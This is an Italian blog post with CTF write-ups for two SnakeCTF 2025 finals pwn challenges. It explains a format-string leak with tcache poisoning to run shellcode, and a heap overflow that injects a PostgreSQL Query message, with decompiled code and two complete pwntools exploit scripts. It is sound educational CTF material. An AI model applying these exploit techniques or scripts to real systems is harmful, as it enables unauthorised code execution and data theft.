---
title: "Finali SnakeCTF 2025"
date: 2025-12-08T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["finals", "ctf", "pwn", "reverse", "snakectf"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025."
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "Finali SnakeCTF 2025 🐍" # alt text
    caption: "I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---

# Finali SnakeCTF 2025 🐍

![logo SnakeCTF](/images/snake.png)

Prima di entrare nelle soluzioni delle due challenge su cui ho lavorato con `@Gabrain24` e `@Renny`, voglio dire quanto mi sono divertito a giocare questa CTF. È stato davvero molto divertente, e condividere l’esperienza con i miei compagni e amici del team **pwnthem0le** l’ha resa ancora migliore.

## Shellcode Wannabe

**Shellcode Wannabe** era un semplice binario ELF per `x86_64` scritto in `C`, che forniva all’utente quattro azioni principali:

* **Create** uno shellcode, allocando *0x400* byte sull’heap in un mapping di memoria `RW`.
* **Delete** uno shellcode, liberando la chunk allocata durante la creazione.
* **Edit** uno shellcode, sovrascrivendone i byte.
* **Execute** lo shellcode, letteralmente chiamandolo:

  ```asm
  mov     rdx, [rbp+s]
  mov     eax, 0
  call    rdx
  ```

Prima che il servizio partisse effettivamente, la challenge invocava la funzione `initialize_challenge`, implementata come segue:

```c
__int64 initialize_challenge()
{
  unsigned int v0;
  __int64 result;
  int i;

  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  v0 = time(0);
  srand(v0);
  menu();
  for ( i = 0; i <= 15; ++i )
    secret[i] = rand() % 26 + 65;
  shellcode = (__int64)mmap(0, 0x400u, 7, 34, -1, 0); // RWX memory
  result = shellcode;
  if ( shellcode == -1 )
  {
    perror("mmap");
    exit(1);
  }
  return result;
}
```

Questa configurazione era interessante perché, come detto, la challenge ci consentiva di scrivere **solo** in una regione di memoria Read-Write, il che significava che non potevamo eseguire direttamente il nostro codice iniettato.
Di conseguenza, per ottenere la flag era prima necessario leakare l’indirizzo dello shellcode e poi ottenere *una qualche forma di arbitrary write* su quel mapping RWX.

Questo era possibile grazie a più vulnerabilità presenti nella challenge, tra cui:

* **Double free**, il comando delete non controllava mai se un puntatore fosse già stato liberato.
* **Printf vulnerability**, a ogni iterazione la challenge stampava la versione disassemblata dello shellcode usando *capstone*. Durante questo processo validava una **secret di 16 byte** (usata come sanity check sulla memoria dello shellcode) e, solo quando lo shellcode era esattamente lungo **992 byte**, aggiungeva una **stringa di 32 byte** alla fine del disassemblato.
  Questa stringa iniziava con il secret e terminava con 16 byte che potevano essere facilmente sovrascritti una volta conosciuta il secret.

```c
char *__fastcall print_assembly(__int64 a1, int a2)
{
  ...
  v3 = a2;
  v14 = __readfsqword(0x28u);
  *(_QWORD *)format = 0;
  v12 = 0;
  memset(s, 0, 0xFFF0u);
  v9 = (char *)malloc(0x10000u);
  if ( a2 > 992 )
    v3 = 992;
  if ( strncmp((const char *)(a1 + 992), secret, 0x10u) )
    return 0;
  if ( (unsigned int)cs_open(3, 8, &v5) )
    return 0;
  v10 = cs_disasm(v5, a1, v3, 4096, 0, &v6);
  if ( v10 )
  {
    v7 = 0;
    for ( i = 0; i < v10; ++i )
    {
      v4 = snprintf(
             &format[v7],
             0x100u,
             "0x%lx:\t%s\t\t%s\n",
             *(_QWORD *)(v6 + 240 * i + 8),
             (const char *)(v6 + 240 * i + 34),
             (const char *)(v6 + 240 * i + 66));
      if ( v4 < 0 )
        return 0;
      if ( (unsigned __int64)(v4 + v7) > 0xFFFF )
        return 0;
      v7 += v4;
    }
    if ( v3 == 992 ) // only when 992 bytes long
      memcpy(&format[v7], (const void *)(a1 + 992), 0x20u); // 32 bytes
    snprintf(v9, 0x10000u, format); // printf vulnerability
    cs_free(v6, v10);
  }
  else
  {
    puts("ERROR: Failed to disassemble given code!");
  }
  cs_close(&v5);
  return v9;
}
```

Tenendo questo a mente, il primo passo è stato leakare il secret.

Si è rivelato piuttosto semplice: scrivendo uno shellcode di *992 byte* composto interamente da istruzioni `nop`, la challenge avrebbe leakato il secret come parte del disassemblato. Una volta leakata, potevamo sovrascriverla per andare in overflow nei 16 byte successivi, come spiegato sopra.

Usando questa primitive siamo riusciti a leakare praticamente tutto ciò che ci serviva, inclusi:

* L’indirizzo di `main`.
* Un indirizzo casuale dell’heap.

Da questi leak abbiamo ricavato sia il base address PIE dell’eseguibile principale, sia la base della regione heap.

A questo punto, i passi rimanenti erano leakare l’indirizzo della regione RWX (possibile grazie al leak del **PIE** e quindi dell’indirizzo `.bss` del puntatore allo shellcode) e poi forzare `malloc` a restituire proprio quel puntatore.

```
.bss:0000000000202050                 public secret
.bss:0000000000202050 ; char secret[]
.bss:0000000000202050 secret          dq ?                    ; DATA XREF: initialize_challenge+96↑o
.bss:0000000000202050                                         ; print_assembly+8F↑o ...
.bss:0000000000202058 qword_202058    dq ?                    ; DATA XREF: main+173↑r
.bss:0000000000202060                 public shellcode
.bss:0000000000202060 shellcode       dq ?                    ; DATA XREF: initialize_challenge+CF↑w
.bss:0000000000202060                                         ; initialize_challenge+D6↑r
.bss:0000000000202060 _bss            ends
```

Per leakare la regione RWX è stato necessario usare di nuovo la primitive di printf, ma con un po’ di attenzione: l’indirizzo era **allineato a 64 bit**, il che significava che la presenza di un byte nullo iniziale faceva fallire `printf`.
Questo dettaglio piuttosto sottile mi è costato circa un’ora di debugging durante la CTF.

Una volta ottenuti tutti i leak, l’ultimo passo era ottenere un arbitrary write sulla regione RWX. L’approccio è stato:

1. **Delete** di uno shellcode, lasciando una chunk freed nella memoria della challenge.
2. **Edit** dello stesso shellcode, sovrascrivendo il puntatore `fwd` della chunk freed (tcache, dato che la size era piccola) in modo che puntasse alla regione RWX.
3. **Create** di due nuovi shellcode; la seconda allocazione restituiva un puntatore all’interno della regione RWX, permettendoci di scrivere un classico `bash shellcode`, che abbiamo poi eseguito per ottenere la flag remota.

Se ti interessa l’exploit che ho sviluppato, eccolo qui (~~è un po’ orribile tbh~~):

```python
#!/usr/bin/env python3

from pwn import *

TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ('tmux', 'splitw', '-h')

def conn():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="""
            b *print_assembly+656
            b *main+598
            c
        """)
    return remote("shellcode-wannabe.challs.snakectf.org", 1337, ssl=True)

def main():
    r = conn()

    if not args.GDB:
        r.sendlineafter(b": ", TOKEN.encode())
    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", asm("nop")*992)
    r.sendlineafter(b": ", b"delete")
    for _ in range(992):
        r.recvline()
    secret = r.recvline().strip()
    print(secret)

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendlineafter(b": ", asm("nop")*992 + secret + b"%p%8209$p")
    for _ in range(993):
        r.recvline()
    f = r.recvline()[16:].decode().strip()
    for _ in range(992):
        r.recvline()
    data = r.recvline().decode().strip()
    f = int(data[16:31], 16)
    f1 = int(data[30:], 16) - 0x136c
    exe.address = f1 - exe.sym["main"]
    r.sendlineafter(b": ", b"delete")
    print(f"leak heap: {hex(f)}")
    print(f"leak base addr exe: {hex(exe.address)}")

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", asm("nop")*992 + secret + b"%1753$sA" + p64(exe.address + 0x202060 + 4861 + 1))

    for _ in range(993 + 994):
        r.recvline()
    data = b'\0' + r.recvline().strip()[16:][:5].ljust(7, b"\x00")

    print(len(data))
    r.sendlineafter(b": ", b"delete")
    
    for _ in range(992):
        r.recvline()
    # inizio double free
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", data)
    for _ in range(992):
        r.recvline()
    log.info("Leak: " + hex(u64(data)))
    log.info("Orig: " + hex(exe.address + 0x202060 + 4861))
    log.info("F: " + hex(f))

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"create")

    r.sendlineafter(b": ", b"edit")
    r.sendlineafter(b": ", asm(shellcraft.sh()))

    r.interactive()


if __name__ == "__main__":
    main()
```

## PG Slop Notes 🔥

Questa challenge è stata davvero una bomba. `@Renny` ed io ci siamo divertiti così tanto a risolverla che, dopo un po’, abbiamo smesso di preoccuparci della scoreboard e volevamo solo continuare a giocare con il binario.

Il servizio esponeva un’interfaccia “sloppy” verso un database PostgreSQL remoto. Il binario in sé era solo un client: si connetteva a un DB remoto e permetteva all’utente di interagirci tramite un semplice menu:

```c
void __cdecl menu()
{
  puts("1 > New note");
  puts("2 > Search note by ID");
  puts("3 > Search note by owner");
  puts("4 > Edit note");
  puts("5 > Delete note");
  puts("6 > Exit");
}
```

Dal lato remoto, lo schema del database era il seguente:

```sql
create table notes (
    id serial primary key,
    content text not null,
    created_at timestamp default current_timestamp,
    owner varchar(64) not null,
    secret_key varchar(16) not null
);

create table flags (
    flag varchar(128) primary key
);

insert into flags (flag) values ('snakeCTF{placeholder}');
```

La flag era salvata in una tabella dedicata `flags`, e nessuna delle funzioni “normali” del programma la toccava mai: non c’era nessuna opzione del menu che facesse riferimento a `flags`.
Quindi l’unico modo realistico per recuperare la flag era in qualche modo manomettere l’SQL inviato, oppure abusare direttamente del wire protocol di PostgreSQL.

La particolarità interessante era che il binario non usava i semplici messaggi `Query` del protocollo, ma sfruttava l’extended query protocol di PostgreSQL, costruendo messaggi come Bind, Describe, Execute e Sync, che venivano poi inviati come un unico buffer combinato sul socket.

La funzione `pg_conn_run_prepared_stmt` era responsabile dell’invio di uno prepared statement e dei relativi parametri. Internamente creava quattro messaggi in questo ordine:

* un messaggio **Bind** che prendeva uno prepared statement e alcuni parametri e li trasformava in un portal,
* un messaggio **Describe** per ottenere i metadati del portal o dello statement,
* un messaggio **Execute** per eseguire effettivamente il portal,
* e un ultimo messaggio **Sync** per flushare tutto e riportare il server in uno stato consistente.

Tutti e quattro i messaggi venivano poi serializzati in un unico buffer contiguo sull’heap e scritti sul socket con una singola `send()`.

Il messaggio Bind è quello che conta di più per l’exploit, perché è il punto in cui i dati controllati dall’utente (content della nota, owner, secret key) vengono impacchettati nel protocollo.

La sua struttura, semplificata, è più o meno questa. Prima c’è un header con il tipo di messaggio (`'B'`), la lunghezza complessiva, il nome del portal e il nome dello statement:

```text
+--------+-----------------------+------------------------------+-------------------------------+
| 1 byte | 4 bytes               | variable                     | variable                      |
| 'B'    | length (Int32)        | portal name (String, C-str)  | statement name (String)       |
+--------+-----------------------+------------------------------+-------------------------------+
                                      ^
                                      length includes everything from here to the end
```

Poi arrivano i format dei parametri, i valori dei parametri e i format del risultato. La parte chiave per noi è come vengono codificati i parametri: per ogni parametro c’è un campo di lunghezza a 4 byte seguito da quel numero di byte, oppure `-1` se il parametro è NULL.

Gli altri messaggi (Describe, Execute, Sync) sono relativamente semplici:

* Describe contiene un flag di tipo (“statement” o “portal”) e un nome.
* Execute contiene il nome del portal e un max-row count.
* Sync è sostanzialmente un messaggio di dimensione fissa che dice “flush tutto”.

La cosa importante non sono tanto le loro semantiche, quanto il fatto che tutti vengono scritti in un singolo buffer dopo il Bind. Il layout in memoria è quindi:

```text
[ Bind ][ Describe ][ Execute ][ Sync ]
```

Se riusciamo a far calcolare male la dimensione del messaggio Bind, possiamo andare in overflow sui messaggi successivi.

La funzionalità “New note” ci dava esattamente la primitive di cui avevamo bisogno. L’handler per la creazione di una nuova nota leggeva il content dallo stdin usando `read()` e poi lo usava come primo parametro per lo prepared statement `insert_note`.

Il codice era questo:

```c
printf("Content: ");
len = read(0, content_buf, 0x1FFu); // 511 bytes max
if ( len )
{
  content_buf[len] = 0;
  content_buf[strcspn(content_buf, "\n")] = 0;

  printf("Owner: ");
  fgets(owner, 64, stdin);
  owner[strcspn(owner, "\n")] = 0;

  gen_random_secret_key(secret_key, 0x11u);
  secret_key[16] = 0;

  params[0].value = content_buf;
  params[0].length = len;              // uses length as returned by read()
  params[1].value = owner;
  params[1].length = strlen(owner);
  params[2].value = secret_key;
  params[2].length = 16;

  result = pg_conn_run_prepared_stmt(conn, "insert_note", 3u, params);
  if ( result && result->row_count > 0 )
    printf(
      "Note created with ID: %.*s.\nUse secret key %.16s to edit/delete.\n",
      ***result->rows,
      (**result->rows + 4LL),
      secret_key);
  else
    puts("Failed to create note");
  pg_query_result_free(result);
}
else
{
  puts("Invalid content length.");
}
```

La sottigliezza sta in `params[0].length = len;`. Quel `len` è il valore di ritorno di `read()`, che conta i byte grezzi, inclusi eventuali `\0` nel mezzo dell’input.

Più avanti, quando viene costruito il messaggio Bind, la funzione `pg_msg_get_size` viene usata per calcolare quanto grande sarà il messaggio. Questa dimensione viene poi usata per allocare il buffer sull’heap che conterrà i messaggi Bind + Describe + Execute + Sync. Tuttavia `pg_msg_get_size` usa `strlen()` sui valori dei parametri invece dei campi di lunghezza espliciti.

L’implementazione di `pg_msg_get_size` per Bind è (semplificando) la seguente:

```c
pg_msg_get_size(msg)
{
  param_sizes = 0;
  for ( i = 0; i < *(msg + 12); ++i )
    param_sizes += strlen(*(*(8LL * i + *(msg + 4)) + 8LL)) + 4;

  v1 = strlen(*(msg + 1));    // statement name
  return v1 + strlen(*(msg + 2)) + param_sizes + 13;
}
```

Quindi la dimensione del messaggio Bind viene calcolata sommando `strlen(parameter_value) + 4` per ogni parametro. Se il nostro content contiene un byte nullo in mezzo, `strlen()` si ferma a quel byte e vede una stringa più corta rispetto a quella che abbiamo effettivamente fornito.

Considera un input del tipo:

```text
"AAAA\x00AAAA\n"
```

La `read()` vede 10 byte: quattro `A`, un `\0`, altre quattro `A` e un newline. Quindi `len = 10`. Il programma sostituisce il newline con un null terminator, ma la stringa contiene ancora il primo `\0` in mezzo. Se chiami `strlen(content_buf)` ottieni solo 4, perché si ferma al primo `\0`.

Questo crea un mismatch:

* La struttura del parametro per Bind dice “length = 10”.
* Il calcolo della dimensione del Bind, usando `strlen()`, dice “questo parametro ha 4 byte di dati”.

L’allocazione sull’heap per i messaggi combinati usa `pg_msg_get_size(bind_msg)` con la dimensione più corta, quindi il buffer allocato è troppo piccolo per i dati che verranno copiati in seguito.

Il colpo di grazia è il codice che serializza effettivamente i parametri del Bind nel buffer. Ricalcola `vlen` con `strlen()`, ma poi usa il campo `.length` (preso da `read()`) come size per la copia:

```c
for ( i = 0; i < msg->param_count; ++i )
{
  vlen = strlen(msg->param_values[i]->value); // short length
  *(int32_t *)&buffer[offset] = htonl(vlen);  // this is what is encoded into the message
  offsetb = offset + 4;

  memcpy(&buffer[offsetb],
         msg->param_values[i]->value,
         msg->param_values[i]->length);       // copies full read() length

  offset = vlen + offsetb;                   // advances only by vlen, not by copied bytes
}
```

In altre parole, il serializer del Bind:

* dice a PostgreSQL “ci sono vlen byte di dati per il parametro”,
* in realtà scrive nel buffer `length` byte controllati dall’utente, che possono essere più grandi di `vlen`,
* e poi avanza l’offset come se avesse scritto solo `vlen` byte.

Dato che anche il buffer sull’heap è stato dimensionato usando `strlen()`, la combinazione di questi errori porta a un heap buffer overflow: i dati controllati dall’utente dal Bind traboccano oltre la fine di dove il messaggio Bind avrebbe dovuto fermarsi.

Torniamo ora a `pg_conn_run_prepared_stmt`. Dopo aver calcolato tutte le dimensioni, alloca un unico buffer:

```c
bind_msg_size     = pg_msg_get_size(bind_msg);
describe_msg_size = pg_msg_get_size(describe_msg);
execute_msg_size  = pg_msg_get_size(execute_msg);
total = execute_msg_size + describe_msg_size + bind_msg_size + pg_msg_get_size(sync_msg);
buf = malloc(total);
```

Poi serializza ciascun messaggio nella posizione corretta:

```c
sync_msg_size      = pg_msg_serialize_to(sync_msg, &buf[execute_msg_size + describe_msg_size + bind_msg_size]);
execute_msg_sizea  = pg_msg_serialize_to(execute_msg, &buf[describe_msg_size + bind_msg_size]);
describe_msg_sizea = pg_msg_serialize_to(describe_msg, &buf[bind_msg_size]);
bind_msg_sizea     = pg_msg_serialize_to(bind_msg, buf);
```

Quindi il layout previsto è:

```text
buf:
  [ Bind ][ Describe ][ Execute ][ Sync ]
```

Tuttavia, la serializzazione del Bind scrive più byte di `bind_msg_size` a causa del mismatch sulla lunghezza. Questo significa che i dati del Bind vanno in overflow sulla porzione che avrebbe dovuto contenere i messaggi Describe, Execute e Sync.

Dal nostro punto di vista, questa è una primitive molto potente: controlliamo ora una parte di memoria che verrà inviata tale e quale sulla rete dopo un Bind valido. Scegliendo con cura il contenuto dell’overflow, possiamo sovrascrivere i messaggi successivi con byte arbitrari del protocollo.

Ancora meglio, mettendo il byte nullo all’inizio del content della nota, facciamo in modo che `strlen(content_buf)` sia praticamente zero pur avendo fino a 510 byte letti da `read()`. Questo massimizza la differenza tra la dimensione “dichiarata” e i dati effettivamente scritti, dandoci una grossa area da sovrascrivere.

Alla fine, invece del layout originale:

```text
+---+---+---+---+
| B | D | E | S |  (intended)
+---+---+---+---+
```

otteniamo di fatto:

```text
+---+-----------+
| B | Q-crafted |  (what we actually send)
+---+-----------+
```

Il Bind resta valido, ma il resto dello stream diventa ciò che abbiamo iniettato noi. In particolare, possiamo scrivere un messaggio `Query` (`'Q'`) con SQL arbitrario.

Abbiamo ancora bisogno di un modo per farci tornare il risultato della query malevola. Qui entra in gioco la logica di stampa della “New note”.

Dopo che `pg_conn_run_prepared_stmt` ritorna, la funzione controlla il risultato e, se almeno una row è stata restituita, stampa un ID come stringa:

```c
result = pg_conn_run_prepared_stmt(conn, "insert_note", 3u, params);
if ( result && result->row_count > 0 )
  printf(
    "Note created with ID: %.*s.\nUse secret key %.16s to edit/delete.\n",
    ***result->rows,
    (**result->rows + 4LL),
    secret_key);
else
  puts("Failed to create note");
```

L’indicizzazione dentro `result->rows` è un po’ brutta, ma l’idea è semplice: prende la prima colonna della prima row e la stampa come stringa. In condizioni normali, lo prepared statement che inserisce una nota restituirebbe l’`id` della nuova nota, e il programma mostrerebbe qualcosa tipo “Note created with ID: 42”.

Tuttavia, dato che abbiamo sovrascritto i messaggi successivi con il nostro messaggio `Query`, possiamo invece eseguire una query del tipo:

```sql
SELECT flag FROM flags;
```

Il server eseguirà quella query e invierà indietro una row contenente la flag. Il client, convinto di ricevere il risultato di `insert_note`, tratterà il primo field della row come il “note ID” e lo stamperà. La stringa che appare al posto dell’ID è in realtà la flag.

Quindi, la catena completa è:

* usare il bug di gestione dell’input per creare un grosso mismatch tra `read()` e `strlen()`,
* sfruttare questo mismatch per fare overflow dal messaggio Bind nella zona dove dovrebbero trovarsi Describe, Execute e Sync,
* sovrascrivere quella zona con un messaggio `Query` valido che esegue un `SELECT` sulla flag,
* e lasciare che la normale routine di stampa mostri il risultato della nostra query malevola come fosse l’ID della nota.

L’unica parte davvero delicata è costruire correttamente i byte del protocollo in modo che, dopo il Bind, il server veda un messaggio `Q` ben formato con la lunghezza giusta e la stringa SQL corretta. Una volta fatto, il leak è diretto.

### Exploit

Durante la CTF abbiamo scritto un exploit in Python un po’ sporco che ricreava il messaggio Bind, inseriva con attenzione un `\0` all’inizio del content della nota e poi sfruttava il conseguente overflow per sovrascrivere il resto del buffer inviato con un messaggio `Query` costruito a mano.
Il codice dell’exploit non è particolarmente elegante, ma era abbastanza affidabile per dumpare la flag, quindi lo abbiamo lasciato così com’era.

Una volta capito che il messaggio Bind veniva sottodimensionato ma copiava comunque tutti i byte ritornati da `read()`, tutto è andato al suo posto: potevamo rompere i messaggi di protocollo successivi e iniettare la nostra query SQL. Il fatto che il client poi stampasse la prima colonna della prima row come stringa ci ha fornito il canale di esfiltrazione perfetto, e la flag è tornata indietro travestita da “note ID”.

In generale è stata una challenge davvero divertente, e un’ottima scusa per sporcarci le mani con l’extended query protocol di PostgreSQL.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
context.terminal = ("tmux", "splitw", "-h")

def conn():
    if args.LOCAL:
        r = process([exe.path], env={"PGPASSWORD": "postgres"}, aslr=False)
        gdb.attach(r, gdbscript="" \
        # "b * pg_conn_send if *(unsigned char*)$rsi == 0x42 || *(unsigned char*)$rsi == 0x51\n" \
        "b *pg_bind_msg_serialize_to")
    else:
        r = remote("f4dba05dc6e4eb22899e88cc0e710ea6.pg-slop-notes.challs.snakectf.org", 1337, ssl=True)

    return r


def q(r):
    r.recvuntil(b': ')

def new_note(r, content, owner):
    r.recvlines(6)
    r.recvuntil(b'> ')
    r.sendline(b'1')
    q(r)
    r.sendline(content)
    q(r)
    r.sendline(owner)
    return
    

def query(sql, size=None):
    query_bytes = sql.encode('utf-8') + b'\x00'
    length = 4 + len(query_bytes)
    return b'Q' + struct.pack('!I', size if size else length) + query_bytes

def stat_query(sql, size=None):
    query_bytes = sql.encode('utf-8') + b'\x00'
    length = 4 + len(query_bytes)
    return b'P' + struct.pack('!I', size if size else length) + query_bytes + b'\0'*3


def describe_stmt(name=''):
    n = name.encode('utf-8') + b'\x00'
    return b'D' + struct.pack('!I', 5 + len(n)) + b'S' + n

def execute_all(portal=''):
    p = portal.encode('utf-8') + b'\x00'
    return b'E' + struct.pack('!I', 8 + len(p)) + p + b'\x00\x00\x00\x00'

def sync_msg():
    return b'S\x00\x00\x00\x04'

def main():
    r = conn()
    new_note(r, "ciao", "ciao")
    q = b'MERDA'*10 + b'\0' + b'A'*30 + query("select flag from flags;")
    print(new_note(r, q, b"alice"))
    try:
        r.interactive()
    except KeyboardInterrupt:
        print("lol")

if __name__ == "__main__":
    main()
```

## Conclusioni

Anche se siamo arrivati ottavi in classifica generale, ho intenzione (o almeno spero) di partecipare di nuovo l’anno prossimo a questa bella CTF (magari per vincere 😎).
